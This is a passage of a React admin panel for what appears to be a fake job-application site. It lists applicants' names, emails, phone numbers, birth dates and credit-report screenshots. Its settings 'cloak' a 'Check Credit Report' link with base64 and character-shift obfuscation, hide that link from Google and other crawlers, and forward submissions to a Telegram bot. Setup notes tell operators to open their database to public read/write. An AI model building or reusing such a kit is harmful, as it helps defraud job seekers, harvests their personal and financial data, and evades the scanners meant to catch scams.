                <h3 className="font-bold text-slate-900">Recent Visitor Logs</h3>
                <button 
                  onClick={handleDeleteLogs}
                  className="flex items-center gap-1 text-xs font-bold text-red-600 hover:text-red-700"
                >
                  <Trash2 size={14} /> Erase All Logs
                </button>
              </div>
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead className="bg-slate-50 border-b border-slate-200">
                    <tr>
                      <th className="px-6 py-3 text-[10px] font-bold text-slate-500 uppercase">Country</th>
                      <th className="px-6 py-3 text-[10px] font-bold text-slate-500 uppercase">Device</th>
                      <th className="px-6 py-3 text-[10px] font-bold text-slate-500 uppercase">Browser</th>
                      <th className="px-6 py-3 text-[10px] font-bold text-slate-500 uppercase">Action</th>
                      <th className="px-6 py-3 text-[10px] font-bold text-slate-500 uppercase">Time</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100">
                    {visitorLogs.slice(0, 20).map((log) => (
                      <tr key={log.id} className="hover:bg-slate-50/50 transition-colors">
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-2">
                            {(!log.countryCode || log.countryCode === 'UN') ? (
                              <span className="text-lg">🌐</span>
                            ) : (
                              <img 
                                src={`https://purecatss.github.io/static_assets/flags/${log.countryCode.toLowerCase()}.png`} 
                                alt={log.countryCode}
                                className="w-6 h-4 object-cover rounded-sm shadow-sm"
                                onError={(e) => {
                                  (e.target as HTMLImageElement).style.display = 'none';
                                }}
                              />
                            )}
                            <span className="text-sm font-medium text-slate-700">{log.country || 'Unknown'}</span>
                          </div>
                        </td>
                        <td className="px-6 py-4 text-sm text-slate-600">{log.device}</td>
                        <td className="px-6 py-4 text-sm text-slate-600">{log.browser}</td>
                        <td className="px-6 py-4">
                          <span className={cn(
                            "inline-flex rounded-full px-2 py-0.5 text-[10px] font-bold uppercase",
                            log.isClick ? "bg-blue-100 text-blue-700" : "bg-slate-100 text-slate-600"
                          )}>
                            {log.isClick ? "Link Click" : "Page View"}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-xs text-slate-500">
                          {log.timestamp?.toDate ? log.timestamp.toDate().toLocaleString() : 'Just now'}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {activeTab === "applications" && (
          <div className="space-y-6">
            <div className="rounded-xl border border-slate-200 bg-white shadow-sm overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead className="bg-slate-50 border-b border-slate-200">
                    <tr>
                      <th className="px-6 py-4 text-sm font-bold text-slate-700">ID</th>
                      <th className="px-6 py-4 text-sm font-bold text-slate-700">Applicant</th>
                      <th className="px-6 py-4 text-sm font-bold text-slate-700">Position</th>
                      <th className="px-6 py-4 text-sm font-bold text-slate-700">Submitted At</th>
                      <th className="px-6 py-4 text-sm font-bold text-slate-700">Screenshot</th>
                      <th className="px-6 py-4 text-sm font-bold text-slate-700">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100">
                    {applications.map((app) => (
                      <tr key={app.id}>
                        <td className="px-6 py-4 text-xs font-mono font-bold text-blue-600">{app.applicationId || 'N/A'}</td>
                        <td className="px-6 py-4">
                          <div className="font-semibold text-slate-900">{app.firstName} {app.lastName}</div>
                          <div className="text-xs text-slate-500">{app.email}</div>
                        </td>
                        <td className="px-6 py-4 text-sm text-slate-600">{app.position}</td>
                        <td className="px-6 py-4 text-sm text-slate-500">
                          {app.submittedAt?.toDate ? app.submittedAt.toDate().toLocaleString() : 'Just now'}
                        </td>
                        <td className="px-6 py-4">
                          {app.creditReportScreenshot ? (
                            <span className="inline-flex items-center gap-1 rounded-full bg-green-100 px-2.5 py-0.5 text-xs font-medium text-green-800">
                              <CheckCircle2 size={12} /> Available
                            </span>
                          ) : (
                            <span className="inline-flex items-center gap-1 rounded-full bg-red-100 px-2.5 py-0.5 text-xs font-medium text-red-800">
                              Missing
                            </span>
                          )}
                        </td>
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-3">
                            <button 
                              onClick={() => setSelectedApp(app)}
                              className="flex items-center gap-1 text-sm font-bold text-blue-600 hover:text-blue-700"
                            >
                              <Eye size={14} /> View
                            </button>
                            <button 
                              onClick={() => handleDeleteApplication(app.id)}
                              className="flex items-center gap-1 text-sm font-bold text-red-600 hover:text-red-700"
                            >
                              <Trash2 size={14} /> Delete
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
              {applications.length === 0 && (
                <div className="p-12 text-center text-slate-500 border-t border-slate-100">
                  No applications found yet.
                </div>
              )}
            </div>
          </div>
        )}

        {activeTab === "settings" && (
          <div className="grid gap-8 lg:grid-cols-2">
            <div className="space-y-8">
              {/* Social & Logo Settings */}
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <h3 className="mb-4 font-bold text-slate-900">Branding & Social</h3>
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Logo Size</label>
                    <select
                      value={newLogoSize}
                      onChange={(e) => setNewLogoSize(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    >
                      <option value="small">Small</option>
                      <option value="medium">Medium</option>
                      <option value="large">Large</option>
                    </select>
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Facebook URL</label>
                    <input type="text" value={newSocialLinks.facebook || ''} onChange={(e) => setNewSocialLinks({...newSocialLinks, facebook: e.target.value})} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Twitter URL</label>
                    <input type="text" value={newSocialLinks.twitter || ''} onChange={(e) => setNewSocialLinks({...newSocialLinks, twitter: e.target.value})} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Instagram URL</label>
                    <input type="text" value={newSocialLinks.instagram || ''} onChange={(e) => setNewSocialLinks({...newSocialLinks, instagram: e.target.value})} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">LinkedIn URL</label>
                    <input type="text" value={newSocialLinks.linkedin || ''} onChange={(e) => setNewSocialLinks({...newSocialLinks, linkedin: e.target.value})} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">YouTube URL</label>
                    <input type="text" value={newSocialLinks.youtube || ''} onChange={(e) => setNewSocialLinks({...newSocialLinks, youtube: e.target.value})} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none" />
                  </div>
                  <button 
                    onClick={handleUpdateSocialAndLogo}
                    className="w-full rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                  >
                    Save Branding & Social
                  </button>
                </div>
              </div>

              {/* General Settings */}
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <h3 className="mb-4 font-bold text-slate-900">General Settings</h3>
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Company Name</label>
                    <div className="flex flex-col gap-3 sm:flex-row">
                      <input 
                        type="text" 
                        value={newCompanyName}
                        onChange={(e) => setNewCompanyName(e.target.value)}
                        placeholder="Enter company name"
                        className="flex-grow rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                      />
                      <button 
                        onClick={handleUpdateCompanyName}
                        className="rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                      >
                        Save
                      </button>
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Review Text (Step 3)</label>
                    <textarea 
                      value={newReviewText}
                      onChange={(e) => setNewReviewText(e.target.value)}
                      placeholder="Enter review text"
                      className="w-full h-40 rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none resize-none"
                    />
                    <button 
                      onClick={handleUpdateReviewText}
                      className="w-full rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                    >
                      Save Review Text
                    </button>
                  </div>
                </div>
              </div>

              {/* Advanced Link Protection */}
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <h3 className="mb-4 font-bold text-slate-900">Advanced Link Protection (Cloaking)</h3>
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Button Text</label>
                    <input 
                      type="text" 
                      value={newButtonText}
                      onChange={(e) => setNewButtonText(e.target.value)}
                      placeholder="Check Credit Report"
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Destination URL</label>
                    <input 
                      type="url" 
                      value={newUrl}
                      onChange={(e) => setNewUrl(e.target.value)}
                      placeholder="https://example.com"
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    />
                  </div>

                  <div className="space-y-3 pt-2">
                    <div className="flex items-center justify-between rounded-lg bg-slate-50 p-3">
                      <div className="flex items-center gap-2">
                        <Shield className={cn("h-5 w-5", isCloakingEnabled ? "text-green-600" : "text-slate-400")} />
                        <div>
                          <div className="text-sm font-bold text-slate-900">Enable Cloaking</div>
                          <div className="text-[10px] text-slate-500">Base64 encode the destination URL</div>
                        </div>
                      </div>
                      <button 
                        onClick={() => {
                          const nextState = !isCloakingEnabled;
                          setIsCloakingEnabled(nextState);
                          const finalUrl = nextState ? btoa(newUrl.trim()) : newUrl.trim();
                          setCreditReportUrl(finalUrl);
                          saveSettings({ isCloakingEnabled: nextState, creditReportUrl: finalUrl });
                        }}
                        className={cn("relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none", isCloakingEnabled ? "bg-blue-600" : "bg-slate-200")}
                      >
                        <span className={cn("pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out", isCloakingEnabled ? "translate-x-5" : "translate-x-0")} />
                      </button>
                    </div>

                    <div className="flex items-center justify-between rounded-lg bg-slate-50 p-3">
                      <div className="flex items-center gap-2">
                        <Zap className={cn("h-5 w-5", blockBots ? "text-orange-500" : "text-slate-400")} />
                        <div>
                          <div className="text-sm font-bold text-slate-900">Block Bots & Crawlers</div>
                          <div className="text-[10px] text-slate-500">Hide link from Google, SEO bots, etc.</div>
                        </div>
                      </div>
                      <button 
                        onClick={() => {
                          const nextState = !blockBots;
                          setBlockBots(nextState);
                          saveSettings({ blockBots: nextState });
                        }}
                        className={cn("relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none", blockBots ? "bg-blue-600" : "bg-slate-200")}
                      >
                        <span className={cn("pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out", blockBots ? "translate-x-5" : "translate-x-0")} />
                      </button>
                    </div>

                    <div className="flex items-center justify-between rounded-lg bg-slate-50 p-3">
                      <div className="flex items-center gap-2">
                        <MousePointer2 className={cn("h-5 w-5", requireInteraction ? "text-purple-600" : "text-slate-400")} />
                        <div>
                          <div className="text-sm font-bold text-slate-900">Require Interaction</div>
                          <div className="text-[10px] text-slate-500">User must click "Reveal" before seeing link</div>
                        </div>
                      </div>
                      <button 
                        onClick={() => {
                          const nextState = !requireInteraction;
                          setRequireInteraction(nextState);
                          saveSettings({ requireInteraction: nextState });
                        }}
                        className={cn("relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none", requireInteraction ? "bg-blue-600" : "bg-slate-200")}
                      >
                        <span className={cn("pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out", requireInteraction ? "translate-x-5" : "translate-x-0")} />
                      </button>
                    </div>

                    <div className="flex items-center justify-between rounded-lg bg-slate-50 p-3">
                      <div className="flex items-center gap-2">
                        <Lock className={cn("h-5 w-5", obfuscateUrl ? "text-red-600" : "text-slate-400")} />
                        <div>
                          <div className="text-sm font-bold text-slate-900">Advanced Obfuscation</div>
                          <div className="text-[10px] text-slate-500">Multi-stage encoding + character shifting</div>
                        </div>
                      </div>
                      <button 
                        onClick={() => {
                          const nextState = !obfuscateUrl;
                          setObfuscateUrl(nextState);
                          // Re-encode if enabling
                          if (nextState) {
                            const shifted = newUrl.trim().split('').map(c => String.fromCharCode(c.charCodeAt(0) + 1)).join('');
                            const finalUrl = btoa(btoa(shifted));
                            setCreditReportUrl(finalUrl);
                            saveSettings({ obfuscateUrl: nextState, creditReportUrl: finalUrl, isCloakingEnabled: true });
                            setIsCloakingEnabled(true);
                          } else {
                            saveSettings({ obfuscateUrl: nextState });
                          }
                        }}
                        className={cn("relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none", obfuscateUrl ? "bg-blue-600" : "bg-slate-200")}
                      >
                        <span className={cn("pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out", obfuscateUrl ? "translate-x-5" : "translate-x-0")} />
                      </button>
                    </div>
                  </div>

                  <button 
                    onClick={handleUpdateCreditReportLink}
                    className="w-full rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                  >
                    Save Link Protection Settings
                  </button>
                </div>
              </div>
            </div>

            <div className="space-y-8">
              {/* Form Content Settings */}
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <h3 className="mb-4 font-bold text-slate-900">Form Content Settings (HTML Allowed)</h3>
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Step 3 Title</label>
                    <input type="text" value={newStep3Title} onChange={(e) => setNewStep3Title(e.target.value)} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Step 4 Title 1</label>
                    <input type="text" value={newStep4Title1} onChange={(e) => setNewStep4Title1(e.target.value)} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Step 4 Text 1</label>
                    <textarea value={newStep4Text1} onChange={(e) => setNewStep4Text1(e.target.value)} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none min-h-[60px]" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Step 4 Title 2</label>
                    <input type="text" value={newStep4Title2} onChange={(e) => setNewStep4Title2(e.target.value)} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Step 4 Text 2 (List)</label>
                    <textarea value={newStep4Text2} onChange={(e) => setNewStep4Text2(e.target.value)} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none min-h-[120px]" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Step 4 Note</label>
                    <textarea value={newStep4Note} onChange={(e) => setNewStep4Note(e.target.value)} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none min-h-[60px]" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Bonus Title</label>
                    <input type="text" value={newBonusTitle} onChange={(e) => setNewBonusTitle(e.target.value)} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Bonus Description</label>
                    <textarea value={newBonusDescription} onChange={(e) => setNewBonusDescription(e.target.value)} className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none min-h-[80px]" />
                  </div>
                  <button 
                    onClick={handleUpdateFormContent}
                    className="w-full rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                  >
                    Save Form Content
                  </button>
                </div>
              </div>

              {/* Team Section Settings */}
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <h3 className="mb-4 font-bold text-slate-900">Team Section Settings</h3>
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Team Image URL</label>
                    <input 
                      type="text" 
                      value={newTeamImage}
                      onChange={(e) => setNewTeamImage(e.target.value)}
                      placeholder="https://..."
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Team Image Size</label>
                    <select
                      value={newTeamImageSize}
                      onChange={(e) => setNewTeamImageSize(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    >
                      <option value="small">Small</option>
                      <option value="medium">Medium</option>
                      <option value="large">Large</option>
                    </select>
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Team Title (HTML allowed)</label>
                    <input 
                      type="text" 
                      value={newTeamTitle}
                      onChange={(e) => setNewTeamTitle(e.target.value)}
                      placeholder="Join a world-class team"
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Team Description (HTML allowed)</label>
                    <textarea 
                      value={newTeamDescription}
                      onChange={(e) => setNewTeamDescription(e.target.value)}
                      placeholder="Enter description..."
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none min-h-[80px]"
                    />
                  </div>
                  <button 
                    onClick={handleUpdateTeamSection}
                    className="w-full rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                  >
                    Save Team Section
                  </button>
                </div>
              </div>

              {/* SEO & Footer */}
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <h3 className="mb-4 font-bold text-slate-900">SEO & Footer</h3>
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Page Title Tag</label>
                    <input 
                      type="text" 
                      value={newSeoTitle}
                      onChange={(e) => setNewSeoTitle(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Social Description</label>
                    <textarea 
                      value={newSeoDesc}
                      onChange={(e) => setNewSeoDesc(e.target.value)}
                      className="w-full h-24 rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none resize-none"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Social Thumbnail URL</label>
                    <input 
                      type="url" 
                      value={newSeoThumb}
                      onChange={(e) => setNewSeoThumb(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Footer Copyright Text</label>
                    <input 
                      type="text" 
                      value={footerText}
                      onChange={(e) => setFooterText(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    />
                  </div>
                  <button 
                    onClick={handleUpdateSeo}
                    className="w-full rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                  >
                    Save SEO & Footer
                  </button>
                </div>
              </div>

              {/* Telegram Integration */}
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <h3 className="mb-4 font-bold text-slate-900">Telegram Notifications</h3>
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Bot API Token</label>
                    <input 
                      type="password" 
                      value={newTgToken}
                      onChange={(e) => setNewTgToken(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Target Chat ID</label>
                    <input 
                      type="text" 
                      value={newTgChatId}
                      onChange={(e) => setNewTgChatId(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    />
                  </div>
                  <button 
                    onClick={handleUpdateTelegram}
                    className="w-full rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                  >
                    Save Telegram Settings
                  </button>
                </div>
              </div>

              {/* Logo & Example Image */}
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <h3 className="mb-4 font-bold text-slate-900">Logo & Assets</h3>
                <div className="space-y-6">
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Company Logo</label>
                    <div className="grid grid-cols-8 gap-2 max-h-48 overflow-y-auto p-2 border border-slate-200 rounded-lg bg-slate-50">
                      {Object.entries(ICON_GALLERY).map(([name, Icon]) => (
                        <button
                          key={name}
                          onClick={() => {
                            setLogoName(name as IconName);
                            saveSettings({ logoName: name });
                          }}
                          className={cn("flex h-8 w-8 items-center justify-center rounded-lg border transition-all", logoName === name ? "border-blue-600 bg-blue-100 text-blue-600 shadow-sm" : "border-slate-200 bg-white text-slate-500 hover:bg-slate-100")}
                          title={name}
                        >
                          {/* @ts-ignore */}
                          <Icon size={16} />
                        </button>
                      ))}
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Icon Size</label>
                    <select 
                      value={newLogoSize}
                      onChange={(e) => setNewLogoSize(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    >
                      <option value="small">Small</option>
                      <option value="medium">Medium</option>
                      <option value="large">Large</option>
                    </select>
                  </div>

                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Text Logo Size (Header)</label>
                    <select 
                      value={newLogoTextSize}
                      onChange={(e) => setNewLogoTextSize(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    >
                      <option value="text-sm md:text-lg">Small</option>
                      <option value="text-lg md:text-2xl">Medium</option>
                      <option value="text-2xl md:text-4xl">Large</option>
                      <option value="text-4xl md:text-6xl">Extra Large</option>
                    </select>
                  </div>

                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Text Logo Style (Header)</label>
                    <select 
                      value={newLogoTextStyle}
                      onChange={(e) => setNewLogoTextStyle(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    >
                      <option value="font-normal">Normal</option>
                      <option value="font-semibold">Semibold</option>
                      <option value="font-bold">Bold</option>
                      <option value="font-extrabold">Extrabold</option>
                      <option value="font-serif font-bold">Serif Bold</option>
                      <option value="font-mono font-bold">Mono Bold</option>
                    </select>
                  </div>

                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Text Logo Color Theme (Header & Footer)</label>
                    <select 
                      value={newLogoTextColor}
                      onChange={(e) => setNewLogoTextColor(e.target.value)}
                      className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none"
                    >
                      <option value="bg-gradient-to-r from-blue-600 via-indigo-500 to-cyan-500 bg-clip-text text-transparent">Blue/Cyan Gradient</option>
                      <option value="bg-gradient-to-r from-purple-600 via-pink-500 to-red-500 bg-clip-text text-transparent">Purple/Pink Gradient</option>
                      <option value="bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500 bg-clip-text text-transparent">Emerald/Teal Gradient</option>
                      <option value="bg-gradient-to-r from-orange-500 via-amber-500 to-yellow-500 bg-clip-text text-transparent">Orange/Yellow Gradient</option>
                      <option value="text-slate-900">Solid Dark</option>
                      <option value="text-blue-600">Solid Blue</option>
                      <option value="text-white">Solid White (Footer only)</option>
                    </select>
                  </div>

                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Example Report Image</label>
                    <div className="flex items-center gap-4">
                      <div className="h-16 w-12 overflow-hidden rounded border border-slate-200">
                        <img src={exampleReportImage} alt="Preview" className="h-full w-full object-cover" referrerPolicy="no-referrer" />
                      </div>
                      <input 
                        type="file" 
                        accept="image/*"
                        onChange={(e) => {
                          const file = e.target.files?.[0];
                          if (file) {
                            const reader = new FileReader();
                            reader.onloadend = () => {
                              const base64String = reader.result as string;
                              setExampleReportImage(base64String);
                              saveSettings({ exampleReportImage: base64String });
                            };
                            reader.readAsDataURL(file);
                          }
                        }}
                        className="text-xs"
                      />
                    </div>
                  </div>
                  <button 
                    onClick={handleUpdateSocialAndLogo}
                    className="w-full rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                  >
                    Save Logo & Assets
                  </button>
                </div>
              </div>

              {/* Database Connectivity */}
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <h3 className="mb-4 font-bold text-slate-900">Database Connectivity</h3>
                
                <div className="mb-6 rounded-lg bg-blue-50 border border-blue-100 p-4">
                  <h4 className="text-sm font-bold text-blue-900 mb-2 flex items-center gap-2">
                    <Database size={16} /> How to Connect Your Own Database
                  </h4>
                  <ol className="list-decimal list-inside text-xs text-blue-800 space-y-1.5">
                    <li>Go to <a href="https://console.firebase.google.com/" target="_blank" rel="noreferrer" className="underline font-semibold">Firebase Console</a> and create a new project.</li>
                    <li>Add a "Web App" to your project and copy the <strong>firebaseConfig</strong> object.</li>
                    <li>Enable <strong>Firestore Database</strong> in test mode (or update the rules to allow public read/write).</li>
                    <li>Paste the JSON configuration into the box below and click <strong>Save Configuration</strong>.</li>
                  </ol>
                </div>

                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-500 uppercase">Firebase Configuration (JSON)</label>
                    <textarea 
                      value={firebaseConfigJson}
                      onChange={(e) => setFirebaseConfigJson(e.target.value)}
                      className="w-full h-48 rounded-lg border border-slate-700 bg-slate-900 text-green-400 font-mono p-4 text-xs focus:border-blue-500 focus:outline-none resize-y"
                      placeholder="{\n  &quot;projectId&quot;: &quot;...&quot;\n}"
                    />
                  </div>
                  
                  <div className="flex flex-col sm:flex-row gap-4">
                    <button 
                      onClick={handleSaveFirebaseConfig}
                      className="flex-1 rounded-lg bg-blue-600 px-6 py-3 font-bold text-white hover:bg-blue-700 transition-all"
                    >
                      Save Configuration
                    </button>
                  </div>

                  <div className="mt-4 pt-4 border-t border-slate-200">
                    <div className="flex items-center justify-between">
                      <div>
                        <h4 className="text-sm font-bold text-slate-900">Database Status</h4>
                        <p className="text-xs text-slate-500">Monitor storage and manage free tier limits</p>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="relative flex h-3 w-3">
                          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                          <span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
                        </span>
                        <span className="text-sm font-bold text-green-600">Connected</span>
                      </div>
                    </div>
                    
                    <div className="mt-4 flex flex-col sm:flex-row gap-4">
                      <button 
                        onClick={handleClearLogs}
                        className="flex-1 rounded-lg border border-orange-200 bg-orange-50 px-4 py-2 text-sm font-bold text-orange-600 hover:bg-orange-100 transition-all"
                      >
                        Clear Old Logs
                      </button>
                      <button 
                        onClick={handleClearApplications}
                        className="flex-1 rounded-lg border border-red-200 bg-red-50 px-4 py-2 text-sm font-bold text-red-600 hover:bg-red-100 transition-all"
                      >
                        Clear All Applications
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Details Modal */}
        <AnimatePresence>
          {selectedApp && (
            <div className="fixed inset-0 z-[100] flex items-center justify-center bg-slate-900/60 p-4 backdrop-blur-sm">
              <motion.div 
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="relative w-full max-w-4xl max-h-[90vh] overflow-y-auto rounded-2xl bg-white p-6 shadow-2xl md:p-10"
              >
                <button 
                  onClick={() => setSelectedApp(null)}
                  className="absolute right-4 top-4 rounded-full p-2 text-slate-400 hover:bg-slate-100 hover:text-slate-600"
                >
                  <Zap size={24} className="rotate-45" />
                </button>

                <div className="grid gap-8 md:grid-cols-2">
                  <div className="space-y-6">
                    <div>
                      <h2 className="text-3xl font-bold text-slate-900">{selectedApp.firstName} {selectedApp.lastName}</h2>
                      <p className="text-blue-600 font-semibold">{selectedApp.position}</p>
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-1">
                        <p className="text-[10px] font-bold text-slate-400 uppercase">Email</p>
                        <p className="text-sm font-medium text-slate-700">{selectedApp.email}</p>
                      </div>
                      <div className="space-y-1">
                        <p className="text-[10px] font-bold text-slate-400 uppercase">Phone</p>
                        <p className="text-sm font-medium text-slate-700">{selectedApp.phone}</p>
                      </div>
                      <div className="space-y-1">
                        <p className="text-[10px] font-bold text-slate-400 uppercase">DOB</p>
